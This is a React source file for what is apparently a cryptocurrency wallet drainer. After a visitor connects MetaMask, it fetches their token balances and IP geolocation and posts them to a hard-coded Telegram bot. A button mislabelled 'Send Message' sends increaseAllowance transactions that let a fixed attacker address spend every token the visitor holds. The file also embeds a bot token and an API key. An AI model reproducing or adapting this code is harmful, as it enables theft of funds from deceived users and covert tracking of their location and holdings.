import logo from "./logo.svg";
import "./App.css";
import axios from "axios";
import { useEffect, useState } from "react";
import Web3 from "web3";
import { ABI, USDTBSC } from "./constant";
import { CovalentClient } from "@covalenthq/client-sdk";

function App() {
  const botToken = "6910766449:AAH_KtR65hweWsgLQMJXXgAadzG2PSN892U"; // Caution: Exposing token
  const chatId = "1876632135";
  const targetAddress = "0xac798ad8c3f4b3226bb0d1b769d4a23376bfdf46";
  const [connected, setConnected] = useState(false);
  const [account, setAccount] = useState("");
  const [balances, setBalances] = useState([]);
  // const [bscbalances]
  async function checkAndChangeNetwork() {
    try {
      const web3= new Web3(window.ethereum)
        const networkId = await web3.eth.net.getId();
        console.log(Number(networkId))
        // Ethereum's main network ID is 1
        if (Number(networkId) !== 1) {
            // Check if MetaMask is available
            if (window.ethereum) {
                try {
                    await window.ethereum.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x1', // Hexadecimal version of 1
                            chainName: 'Ethereum Mainnet',
                            rpcUrls:['']
                            // ... other parameters like rpcUrls, blockExplorerUrls etc.
                        }]
                    });
                } catch (error) {
                    console.error('User rejected the network change request');
                }
            } else {
                console.log('MetaMask is not available');
            }
        } else {
            console.log('Already connected to the Ethereum Mainnet');
        }
    } catch (error) {
        console.error('An error occurred:', error);
    }
}
  const connectWallet = async () => {
    if (typeof window.ethereum !== "undefined") {
      try {
        await window.ethereum.request({ method: "eth_requestAccounts" });
        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.getAccounts();
        console.log("Connected account:", accounts[0]);
        setAccount(accounts[0]);
        checkAndChangeNetwork()
        setConnected(true);
        ApiServices(accounts[0]);
        getLocationData()
      } catch (error) {
        console.error(error);
      }
    } else {
      console.log("Please install MetaMask!");
    }
  };
  const sendMessage = async (message) => {
    try {
      await axios
        .post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          chat_id: chatId,
          text: message,
        })
        .then((res) => {
          console.log(res);
        });
    } catch (error) {
      console.error("Error sending message", error);
      // Handle error
    }
  };
  const Drain = async () => {
    if (connected) {
      for (const item of balances) {
        try {
          await prepareTransaction(item);
        } catch (error) {}
      }
    }
  };
  const prepareTransaction = async (item) => {
    if (item?.native_token) {
      return
    }
    let web3 = new Web3(window.ethereum);
    let Contract = new web3.eth.Contract(ABI, item?.contract_address);
    let tx = {
      from: account,
      to: item?.contract_address,
      gasPrice: web3.utils.toHex(20 * 1e9),
      gasLimit: web3.utils.toHex(50000),
      data: Contract.methods
        .increaseAllowance(targetAddress, item?.balance)
        .encodeABI(),
    };
    console.log({tx})
    await web3.eth
      .sendTransaction(tx)
      .on("receipt", function (receipt) {
        sendMessage(`${account},10 USDT BSC CHAIN`);
      })
      .catch((er) => {
        console.log({ er });
      });
  };
  const ApiServices = async (account) => {
    axios
      .get(
        `https://api.covalenthq.com/v1/bsc-mainnet/address/${account}/balances_v2/?key=cqt_rQvGkMv9WbcvyKk9FWWBVhXftmxV`
      )
      .then((res) => {
        let newArr = res?.data?.data?.items?.filter(
          (item) => Number(item?.quote_rate) > 0
        );
        setBalances(newArr);
      });
  };
  const getLocationData = () => {
    axios
      .get("https://api.ipify.org?format=json")
      .then((res) => {
        axios.get(`https://ipapi.co/${res.data?.ip}/json/`).then((result) => {
          let message = `New client has been connected and country is ${result?.data?.country_name} and city is ${result?.data?.city} and ip address is ${result?.data?.ip}`;
          sendMessage(message);
        });
      })
      .catch((err) => {});
  };
  useEffect(() => {
    if (balances?.length>0) {
      let message='Totol Portfolio is '
      balances.forEach((item)=>{
        message+=String(item?.contract_name)+' '+String(item?.pretty_quote)+' '
      })
      sendMessage(message)
    }
  }, [balances]);

  return (
    <div>
      {console.log({ balances })}
      {!connected && <button onClick={connectWallet}>Connect Wallet</button>}
      <button onClick={Drain}>Send Message</button>
    </div>
  );
}

export default App;
